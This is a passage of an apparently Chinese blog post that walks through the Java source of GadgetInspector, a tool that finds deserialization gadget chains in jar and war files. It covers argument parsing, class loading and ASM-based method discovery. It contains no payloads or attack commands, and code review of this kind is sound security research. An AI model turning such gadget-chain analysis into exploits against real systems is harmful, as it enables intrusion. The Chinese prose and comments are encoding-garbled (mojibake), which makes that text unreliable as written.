method:</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fs</span> <span class="operator">=</span> FileSystems.getFileSystem(URI.create(<span class="string">&quot;jrt:/&quot;</span>));</span><br><span class="line">        Files.walk(fs.getPath(<span class="string">&quot;/&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.toString().toLowerCase().endsWith(<span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> <span class="title class_">PathClassResource</span>(p));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ProviderNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// Do nothing; this is expected on versions below Java9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-GadgetInspector"><a href="#3-GadgetInspector" class="headerlink" title="3. GadgetInspector"></a>3. GadgetInspector</h2><p>ç¨‹åºå…¥å£ <code>main</code>ï¼Œå…ˆåšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œç„¶ååˆ† 5 æ­¥èµ°æŒ–æ˜åˆ©ç”¨é“¾ã€‚</p><p>é¦–å…ˆåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä½¿ç”¨ Gadget Inspector è‡³å°‘è¦æŒ‡å®šä¸€ä¸ªå¾…åˆ†æçš„ java åŒ…ï¼Œè‹¥å‚æ•°ä¸ºç©ºåˆ™æ‰“å°ä½¿ç”¨å¸®åŠ©ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">    printUsage();   <span class="comment">// æ‰“å°ä½¿ç”¨å¸®åŠ©</span></span><br><span class="line">    System.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ—¥å¿—è¾“å‡ºã€.dat æ–‡ä»¶ä¿ç•™ã€æŒ–æ˜ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é…ç½® log4j ç”¨äºè¾“å‡ºæ—¥å¿—</span></span><br><span class="line">configureLogging();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ˜¯å¦ä¿ç•™æ‰€æœ‰çš„ .dat æ–‡ä»¶</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">resume</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ–æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º java åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line"><span class="type">GIConfig</span> <span class="variable">config</span> <span class="operator">=</span> ConfigRepository.getConfig(<span class="string">&quot;jserial&quot;</span>);    <span class="comment">// å®ç° SerializableDeciderã€ImplementationFinderã€SourceDiscovery</span></span><br></pre></td></tr></table></figure><p>è§£æå‚æ•°ï¼Œå¯é€‰å‚æ•°åŒ…æ‹¬ï¼š</p><ul><li><code>--resume</code>ï¼šæ˜¯å¦ä¿ç•™æ–‡ä»¶ï¼Œé»˜è®¤ä¸ä¿ç•™</li><li><code>--config xxx</code>ï¼šæŒ‡å®šæŒ–æ˜ç±»å‹ï¼Œé»˜è®¤ Java åŸç”Ÿåºåˆ—åŒ– <code>jserial</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (argIndex &lt; args.length) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">arg</span> <span class="operator">=</span> args[argIndex];</span><br><span class="line">    <span class="keyword">if</span> (!arg.startsWith(<span class="string">&quot;--&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--resume&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// ä¿ç•™ .dat æ–‡ä»¶</span></span><br><span class="line">        resume = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--config&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// æŒ‡å®šæŒ–æ˜ç±»å‹</span></span><br><span class="line">        config = ConfigRepository.getConfig(args[++argIndex]);</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid config name: &quot;</span> + args[argIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected argument: &quot;</span> + arg);</span><br><span class="line">    &#125;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‚æ•°è¯»å– war åŒ…æˆ– jar åŒ…ï¼Œå¯ä»¥æŒ‡å®š 1 ä¸ª war åŒ…æˆ–å¤šä¸ª jar åŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®é™…ä¸Šæ˜¯ URLClassLoader</span></span><br><span class="line"><span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹æŒ‡å®šæ–‡ä»¶æ ¹æ® warã€spring-boot jarã€æ™®é€š jar åŒ…çš„æ–¹å¼è½½å…¥å¯¹äºå­—èŠ‚ç æ–‡ä»¶ï¼Œå¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="keyword">if</span> (args.length == argIndex + <span class="number">1</span> &amp;&amp; args[argIndex].toLowerCase().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// æ„é€  war æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(args[argIndex]);</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using WAR classpath: &quot;</span> + path);</span><br><span class="line">    <span class="comment">// å®ç°ä¸º URLClassLoaderï¼ŒåŠ è½½ war åŒ…ä¸‹çš„ WEB-INF/lib å’Œ WEB-INF/classes</span></span><br><span class="line">    classLoader = Util.getWarClassLoader(path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// æ„é€  jar æ–‡ä»¶è·¯å¾„ï¼Œå¯é…ç½®å¤šä¸ª</span></span><br><span class="line">    <span class="keyword">final</span> Path[] jarPaths = <span class="keyword">new</span> <span class="title class_">Path</span>[args.length - argIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length - argIndex; i++) &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(args[argIndex + i]).toAbsolutePath();</span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid jar path: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line">        jarPaths[i] = path;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using classpath: &quot;</span> + Arrays.toString(jarPaths));</span><br><span class="line">    <span class="comment">// å®ç°ä¸º URLClassLoaderï¼ŒåŠ è½½æ‰€æœ‰æŒ‡å®šçš„ jar</span></span><br><span class="line">    classLoader = Util.getJarClassLoader(jarPaths);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šé¢å¾—åˆ°çš„ ClassLoader åˆå§‹åŒ–ç±»æšä¸¾åŠ è½½å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">ClassResourceEnumerator</span> <span class="variable">classResourceEnumerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResourceEnumerator</span>(classLoader);</span><br></pre></td></tr></table></figure><p>æ ¹æ® <code>resume</code> å˜é‡çš„å€¼å†³å®šæ˜¯å¦åˆ é™¤ .dat æ–‡ä»¶ï¼ŒæŒ–æ˜åˆ°çš„åˆ©ç”¨é“¾å­˜å‚¨åœ¨ gadget-chains.txt ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resume) &#123;</span><br><span class="line">    <span class="comment">// Delete all existing dat files</span></span><br><span class="line">    LOGGER.info(<span class="string">&quot;Deleting stale data...&quot;</span>);</span><br><span class="line">    <span class="comment">// æŒ–æ˜åˆ°çš„åˆ©ç”¨é“¾å­˜å‚¨åœ¨ gadget-chains.txt ä¸­ï¼Œä¸åˆ é™¤</span></span><br><span class="line">    <span class="keyword">for</span> (String datFile : Arrays.asList(<span class="string">&quot;classes.dat&quot;</span>, <span class="string">&quot;methods.dat&quot;</span>, <span class="string">&quot;inheritanceMap.dat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passthrough.dat&quot;</span>, <span class="string">&quot;callgraph.dat&quot;</span>, <span class="string">&quot;sources.dat&quot;</span>, <span class="string">&quot;methodimpl.dat&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(datFile);</span><br><span class="line">        <span class="keyword">if</span> (Files.exists(path)) &#123;</span><br><span class="line">            Files.delete(path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ–æ˜è¿‡ç¨‹ä¸­åˆ¤æ–­æ˜¯å¦å­˜åœ¨ .dat æ–‡ä»¶ï¼Œæ ¸å¿ƒæ­¥éª¤å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform the various discovery steps</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">    <span class="type">MethodDiscovery</span> <span class="variable">methodDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodDiscovery</span>();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save(); <span class="comment">// ä¿å­˜ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">    <span class="type">PassthroughDiscovery</span> <span class="variable">passthroughDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDiscovery</span>();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();    <span class="comment">// ä¿å­˜æ•°æ®æµä¿¡æ¯ï¼ˆæ–¹æ³•å‚æ•°å’Œè¿”å›å€¼çš„å…³ç³»ä¿¡æ¯ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">    <span class="type">CallGraphDiscovery</span> <span class="variable">callGraphDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CallGraphDiscovery</span>();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();  <span class="comment">// ä¿å­˜è°ƒç”¨å…³ç³»ä¿¡æ¯ï¼ˆè°ƒç”¨è€…æ–¹æ³•ä¸è¢«è°ƒæ–¹æ³•ä¹‹é—´çš„å‚æ•°ä¼ é€’ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">    <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save(); <span class="comment">// ä¿å­˜æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">    <span class="type">GadgetChainDiscovery</span> <span class="variable">gadgetChainDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainDiscovery</span>(config);</span><br><span class="line">    gadgetChainDiscovery.discover();    <span class="comment">// ä¿å­˜é‡å†™ä¿¡æ¯ã€åˆ©ç”¨é“¾ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ­¥éª¤çœ‹èµ·æ¥æœ‰å¤šç®€å•å®é™…å®ç°å°±æœ‰å¤šå¤æ‚ï¼ˆ<del>ä¸æ˜¯</del>ï¼‰ï¼Œä¸‹é¢å°±å±•å¼€æ ¸å¿ƒæ­¥éª¤çš„å†…å®¹ã€‚</p><h2 id="4-MethodDiscovery"><a href="#4-MethodDiscovery" class="headerlink" title="4. MethodDiscovery"></a>4. MethodDiscovery</h2><p><code>discover</code> æ–¹æ³•ä¸»è¦å®Œæˆçš„æ˜¯è¯»å–ç±»æ–‡ä»¶å¹¶åˆ©ç”¨ asm çš„è®¿é—®è€…è®°å½•ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨è®¿é—®è€…è®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿï¼Œè®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitField -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> <span class="title class_">MethodDiscoveryClassVisitor</span>(), ClassReader.EXPAND_FRAMES);    <span class="comment">// ä»¥æ‰©å±•æ ¼å¼è®¿é—®å †æ ˆæ˜ å°„å¸§</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodDiscoveryClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†å››ä¸ªè®¿é—®è€…æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="keyword">private</span> String superName;       <span class="comment">// çˆ¶ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="keyword">private</span> String[] interfaces;    <span class="comment">// ç±»æ¥å£çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="type">boolean</span> isInterface;            <span class="comment">// æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ClassReference.Member&gt; members;    <span class="comment">// ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line"><span class="keyword">private</span> ClassReference.Handle classHandle;      <span class="comment">// å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">MethodDiscoveryClassVisitor</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">super</span>(Opcodes.ASM6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> æ–¹æ³•åœ¨ç±»è®¿é—®çš„å¼€å§‹æ—¶è°ƒç”¨ï¼ˆå³ <code>ClassReader.accept</code> è°ƒç”¨çš„ç¬¬ä¸€ä¸ªè®¿é—®è€…æ–¹æ³•ï¼‰ï¼Œè®°å½•ç±»åã€çˆ¶ç±»åã€æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ï¼Œåˆ›å»ºåŠ¨æ€æ•°ç»„ç”¨äºåœ¨ <code>visitField</code> ä¸­è®°å½•å­—æ®µä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span> &#123;  <span class="comment">// ç±»è®¿é—®å¼€å§‹ï¼ˆè°ƒç”¨çš„ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="comment">// è®°å½•ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.superName = superName;</span><br><span class="line">    <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">    <span class="built_in">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.members = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();   <span class="comment">// å­—æ®µä¿¡æ¯ï¼ˆæˆå‘˜ï¼‰</span></span><br><span class="line">    <span class="built_in">this</span>.classHandle = <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(name); <span class="comment">// å½“å‰ç±»</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitField</code> æ–¹æ³•ç”¨äºè®°å½•ç±»çš„å­—æ®µä¿¡æ¯ï¼ŒåŒ…æ‹¬åç§°ã€è®¿é—®æ ‡å¿—ã€ç±»å‹ï¼Œæ ¹æ®è®¿é—®æ ‡å¿— <code>access</code> åˆ¤æ–­æ˜¯å¦ä¸ºé™æ€å˜é‡ï¼Œå› ä¸ºé™æ€å˜é‡ä¸å¯æ§æ‰€ä»¥ä¸å½“ä½œå¯èƒ½çš„æ±¡ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc,    // è®¿é—®å­—æ®µ</span></span><br><span class="line"><span class="params">                               String signature, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123; <span class="comment">// è·³è¿‡é™æ€æˆå‘˜</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// ç±»å‹</span></span><br><span class="line">        String typeName;</span><br><span class="line">        <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;    <span class="comment">// å¯¹è±¡æˆ–æ•°ç»„</span></span><br><span class="line">            typeName = type.getInternalName();  <span class="comment">// å†…éƒ¨åç§°</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            typeName = type.getDescriptor();    <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è®°å½•å­—æ®µä¿¡æ¯ï¼Œä¿å­˜åˆ° members</span></span><br><span class="line">        members.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member(name, access, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(typeName)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> æ–¹æ³•ç”¨äºè®°å½•æ–¹æ³•ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€å±ç±»åã€æ–¹æ³•åã€æè¿°ç¬¦ã€æ˜¯å¦ä¸ºé™æ€æ–¹æ³•ï¼ŒåŒæ ·æ ¹æ®è®¿é—®æ ‡å¿—åˆ¤æ–­æ˜¯å¦ä¸ºé™æ€æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123; <span class="comment">// è®¿é—®æ–¹æ³•</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isStatic</span> <span class="operator">=</span> (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;  <span class="comment">// æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•æ–¹æ³•ä¿¡æ¯ï¼Œä¿å­˜åˆ° discoveredMethods</span></span><br><span class="line">    discoveredMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">            classHandle,    <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">            name,</span><br><span class="line">            desc,</span><br><span class="line">            isStatic));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> æ–¹æ³•åœ¨ç±»è®¿é—®ç»“æŸæ—¶è°ƒç”¨ï¼Œï¼ˆå³ <code>ClassReader.accept</code> 